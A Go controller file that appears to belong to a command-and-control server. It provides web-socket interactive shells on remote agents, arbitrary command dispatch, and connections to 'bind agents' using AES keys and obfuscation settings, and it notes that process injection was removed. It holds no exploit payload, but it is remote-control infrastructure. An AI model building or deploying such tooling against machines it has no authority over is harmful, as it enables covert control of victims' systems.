package controllers

import (
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"time"

	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/hub"
	"cupcake-server/services"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/google/uuid"
)

// upgrader 使用 globals 包中定义的全局实例
var upgrader = globals.Upgrader

// openPtyStream opens a Yamux type-0x01 stream for interactive shell.
func openPtyStream(client *globals.Client, uuidStr string) (*globals.PTYSession, error) {
	if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
		return nil, fmt.Errorf("no yamux session")
	}
	stream, err := client.YamuxSession.Open()
	if err != nil {
		return nil, err
	}
	if _, err := stream.Write([]byte{0x01}); err != nil {
		stream.Close()
		return nil, err
	}
	// Brief pause so agent dispatcher reads the type byte before bulk input
	time.Sleep(150 * time.Millisecond)
	sess := &globals.PTYSession{Stream: stream}
	globals.ActivePTYSessions.Store(uuidStr, sess)
	go startPtyBackgroundLoop(uuidStr, sess)
	return sess, nil
}

func StreamPTY(c *gin.Context) {
	uuidStr := c.Param("uuid")
	val, ok := globals.Clients.Load(uuidStr)
	if !ok {
		c.JSON(404, gin.H{"error": "Agent offline"})
		return
	}
	client := val.(*globals.Client)

	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		return
	}
	defer ws.Close()

	// 1. 获取或创建 PTY 会话；若缓存流已死则强制重建
	var sess *globals.PTYSession
	if valP, exists := globals.ActivePTYSessions.Load(uuidStr); exists {
		sess = valP.(*globals.PTYSession)
		sess.Mutex.RLock()
		dead := sess.Stream == nil
		sess.Mutex.RUnlock()
		if dead {
			log.Printf("[PTY] Agent %s has stale PTY session, recreating", uuidStr)
			globals.ActivePTYSessions.Delete(uuidStr)
			sess = nil
		}
	}
	if sess == nil {
		if client.YamuxSession == nil || client.YamuxSession.IsClosed() {
			log.Printf("[PTY] Agent %s has no Yamux session, fallback to command mode", uuidStr)
			StreamPTYFallback(ws, client)
			return
		}
		sess, err = openPtyStream(client, uuidStr)
		if err != nil {
			log.Printf("[PTY] Failed to open stream for %s: %v", uuidStr, err)
			_ = ws.WriteMessage(websocket.BinaryMessage, []byte("\r\n\x1b[31m[!] PTY Stream Error.\x1b[0m\r\n"))
			return
		}
	}

	// 2. 刷出历史缓存并订阅
	sess.Mutex.RLock()
	if len(sess.HistoryBuffer) > 0 {
		_ = ws.WriteMessage(websocket.BinaryMessage, sess.HistoryBuffer)
	}
	sess.Mutex.RUnlock()
	sess.Subscribers.Store(ws, true)

	// 3. 读取前端输入 -> 传输给 Agent（写失败则重建流并重试当前包一次）
	for {
		mt, msg, err := ws.ReadMessage()
		if err != nil {
			break
		}
		if mt != websocket.BinaryMessage && mt != websocket.TextMessage {
			continue
		}

		writeOK := false
		for attempt := 0; attempt < 2 && !writeOK; attempt++ {
			sess.Mutex.Lock()
			needRebuild := sess.Stream == nil
			if !needRebuild && attempt == 0 {
				if c, ok := sess.Stream.(net.Conn); ok {
					_ = c.SetWriteDeadline(time.Now().Add(5 * time.Second))
				}
				_, werr := sess.Stream.Write(msg)
				if werr == nil {
					writeOK = true
					sess.Mutex.Unlock()
					break
				}
				log.Printf("[PTY] Write error for %s (attempt %d): %v", uuidStr, attempt+1, werr)
				_ = sess.Stream.Close()
				sess.Stream = nil
				needRebuild = true
			}
			sess.Mutex.Unlock()

			if needRebuild {
				globals.ActivePTYSessions.Delete(uuidStr)
				newSess, oerr := openPtyStream(client, uuidStr)
				if oerr != nil {
					log.Printf("[PTY] Rebuild failed for %s: %v", uuidStr, oerr)
					_ = ws.WriteMessage(websocket.BinaryMessage, []byte("\r\n\x1b[31m[!] PTY stream dead; reopen terminal.\x1b[0m\r\n"))
					sess.Subscribers.Delete(ws)
					return
				}
				sess = newSess
				sess.Subscribers.Store(ws, true)
				// retry write on rebuilt stream
				sess.Mutex.Lock()
				if sess.Stream != nil {
					if c, ok := sess.Stream.(net.Conn); ok {
						_ = c.SetWriteDeadline(time.Now().Add(5 * time.Second))
					}
					if _, werr := sess.Stream.Write(msg); werr == nil {
						writeOK = true
					} else {
						log.Printf("[PTY] Write after rebuild failed for %s: %v", uuidStr, werr)
						_ = sess.Stream.Close()
						sess.Stream = nil
					}
				}
				sess.Mutex.Unlock()
			}
		}
	}

	sess.Subscribers.Delete(ws)
}

func startPtyBackgroundLoop(uuidStr string, sess *globals.PTYSession) {
	buf := make([]byte, 32768)
	defer func() {
		sess.Mutex.Lock()
		if sess.Stream != nil {
			sess.Stream.Close()
			sess.Stream = nil
		}
		sess.Mutex.Unlock()
		globals.ActivePTYSessions.Delete(uuidStr)
		// PTY session ended silently
	}()

	for {
		sess.Mutex.RLock()
		stream := sess.Stream
		sess.Mutex.RUnlock()
		if stream == nil {
			break
		}

		n, err := stream.Read(buf)
		if n > 0 {
			sess.Mutex.Lock()
			sess.HistoryBuffer = append(sess.HistoryBuffer, buf[:n]...)
			if len(sess.HistoryBuffer) > 131072 {
				sess.HistoryBuffer = sess.HistoryBuffer[len(sess.HistoryBuffer)-131072:]
			}
			sess.Subscribers.Range(func(key, _ interface{}) bool {
				wsconn := key.(*websocket.Conn)
				_ = wsconn.WriteMessage(websocket.BinaryMessage, buf[:n])
				return true
			})
			sess.Mutex.Unlock()
		}
		if err != nil {
			break
		}
	}
}

func StreamPTYFallback(ws *websocket.Conn, client *globals.Client) {
	doneToken := "__CUPCAKE_DONE__"
	modePacket := map[string]string{
		"type":    "PTY_MODE",
		"content": "fallback",
	}
	if data, err := json.Marshal(modePacket); err == nil {
		ws.WriteMessage(websocket.TextMessage, data)
	}
	if data, err := json.Marshal(map[string]string{"type": "PTY_DONE"}); err == nil {
		ws.WriteMessage(websocket.TextMessage, data)
	}
	isWindows := strings.Contains(strings.ToLower(client.OS), "windows")
	if _, loaded := globals.PTYState.LoadOrStore(client.UUID, true); !loaded {
		startMsg := globals.MessageWrapper{
			MsgType: "command",
			Payload: globals.CommandPayload{
				CommandType:    "shell_interactive",
				CommandContent: "",
				ReqID:          uuid.New().String(),
			},
		}
		_ = services.WriteEncryptedMessage(client, startMsg)
	}
	done := make(chan struct{})
	go func() {
		defer close(done)
		for output := range client.OutputChannel {
			packet := map[string]string{"type": "TERM", "content": output}
			if data, err := json.Marshal(packet); err == nil {
				_ = ws.WriteMessage(websocket.TextMessage, data)
			}
		}
	}()
	lineBuf := make([]rune, 0, 256)
	flushLine := func() {
		line := string(lineBuf)
		if len(lineBuf) == 0 {
			client.CommandChannel <- "\r\n"
			return
		}
		if strings.TrimSpace(line) != "" {
			cmd := line
			if isWindows {
				clean := strings.TrimSpace(line)
				if !strings.HasPrefix(clean, "@") {
					clean = "@" + clean
				}
				cmd = fmt.Sprintf("%s & @echo %s", clean, doneToken)
			} else {
				cmd = fmt.Sprintf("%s; echo %s", line, doneToken)
			}
			client.CommandChannel <- cmd
		}
		lineBuf = lineBuf[:0]
	}

	sendTermEcho := func(txt string) {
		packet := map[string]string{"type": "TERM", "content": txt}
		if data, err := json.Marshal(packet); err == nil {
			_ = ws.WriteMessage(websocket.TextMessage, data)
		}
	}

	for {
		mt, msg, err := ws.ReadMessage()
		if err != nil { break }
		if mt == websocket.TextMessage || mt == websocket.BinaryMessage {
			for _, r := range string(msg) {
				switch r {
				case '\r', '\n':
					flushLine()
					sendTermEcho("\r\n")
				case 0x7f, 0x08: // Backspace
					if len(lineBuf) > 0 {
						lineBuf = lineBuf[:len(lineBuf)-1]
						sendTermEcho("\b \b")
					}
				default:
					if r < 0x20 {
						continue
					}
					lineBuf = append(lineBuf, r)
					sendTermEcho(string(r))
				}
			}
		}
	}
}

func HandleAdminShell(c *gin.Context) {
	uuidStr := c.Param("uuid")
	val, ok := globals.Clients.Load(uuidStr)
	if !ok {
		c.JSON(404, gin.H{"error": "Agent Offline"})
		return
	}
	client := val.(*globals.Client)

	ws, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil { return }
	defer ws.Close()

	// 🛡️ Anti-DoS: 限制管理员 Shell WebSocket 单帧大小为 1MB
	ws.SetReadLimit(1 * 1024 * 1024)

	go func() {
		for output := range client.OutputChannel {
			var packet hub.WsPacket
			if err := json.Unmarshal([]byte(output), &packet); err != nil {
				packet = hub.WsPacket{MsgType: "TERM", Content: output}
			}
			ws.WriteJSON(packet)
		}
	}()

	for {
		var msg hub.WsPacket
		if err := ws.ReadJSON(&msg); err != nil { break }
		client.CommandChannel <- msg.Content
	}
}

func MigrateClient(c *gin.Context) {
	// Process injection / memory migration permanently removed from the agent.
	c.JSON(http.StatusGone, gin.H{
		"error": "process migration/injection has been removed from this product",
	})
}

func SendCommand(c *gin.Context) {
	var req struct {
		UUID    string `json:"uuid"`
		Command string `json:"cmd"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}
	if err := services.SendCommand(req.UUID, req.Command); err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	c.JSON(200, gin.H{"status": "success"})
}

func HandleConnectBindAgent(c *gin.Context) {
	var req struct {
		TargetAddr     string `json:"target_addr"`
		AesKey         string `json:"aes_key"`          
		EncryptionSalt string `json:"encryption_salt"`  
		ListenerID     string `json:"listener_id"`      
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid input"})
		return
	}
	if req.TargetAddr == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "target_addr is required"})
		return
	}

	fakeLn := &globals.Listener{
		EncryptMode:    "aes",
		EncryptKey:     req.AesKey,
		EncryptionSalt: req.EncryptionSalt,
		ObfuscateMode:  "none",
	}

	if req.AesKey == "" {
		if req.ListenerID == "" {
			c.JSON(http.StatusBadRequest, gin.H{"error": "aes_key or listener_id is required"})
			return
		}
		val, ok := globals.Listeners.Load(req.ListenerID)
		if !ok {
			c.JSON(http.StatusNotFound, gin.H{"error": "Listener not found or offline"})
			return
		}
		ln := val.(*globals.Listener)
		fakeLn.EncryptKey     = ln.EncryptKey
		fakeLn.EncryptionSalt = ln.EncryptionSalt
		fakeLn.ObfuscateMode  = ln.ObfuscateMode
	}

	target := req.TargetAddr
	if !strings.Contains(target, ":") {
		if req.ListenerID != "" {
			val, ok := globals.Listeners.Load(req.ListenerID)
			if ok {
				pLn := val.(*globals.Listener)
				target = fmt.Sprintf("%s:%d", target, pLn.Port)
			}
		}
	}

	if err := services.ConnectToBindAgent(target, fakeLn); err != nil {
		log.Printf("[TCP] Final target address: %s", target)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "Connecting to bind agent..."})
}

func GetResponse(c *gin.Context) {
	c.JSON(200, gin.H{"status": "ok"})
}
